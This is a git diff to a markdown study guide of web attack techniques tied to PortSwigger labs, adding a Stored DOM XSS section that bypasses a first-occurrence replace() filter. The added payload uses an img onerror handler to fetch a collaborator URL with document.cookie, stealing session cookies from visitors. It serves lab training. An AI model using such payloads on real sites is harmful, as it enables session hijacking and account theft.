@@ -323,6 +323,7 @@ I am unable to get a working cookie stealer payload for this vulnerable lab.....
 [XSS Template Literal](#xss-template-literal)  
 [XSS WAF Bypass](#xss-waf-bypass)  
 [Stored XSS](#stored-xss)  
+[Stored DOM XSS](#stored-dom-xss)  
 [XSS in SVG Upload](#xss-svg-upload)  
   
 ### XSS Resources  
@@ -650,6 +651,20 @@ body:document.cookie
 ```  
 
 [PortSwigger Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)  
+
+### Stored DOM XSS  
+
+>In the JavaScript source code ***identify*** the ```replace()``` function, and testing payloads we see the function only replaces the first occurrence.  
+
+```html
+<><img src=1 onerror=javascript:fetch(`https://COLLABORATOR.com?escape=`+document.cookie)>
+```  
+
+>Above payload is stored and any user visiting the comment blog will result in their session cookie being stolen and send to collaborator.  
+
+![stored dom-xss json comments](images/stored-dom-xss-json-comments.png)  
+
+[PortSwigger Lab: Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)  
   
 ## Web Cache Poison  
 
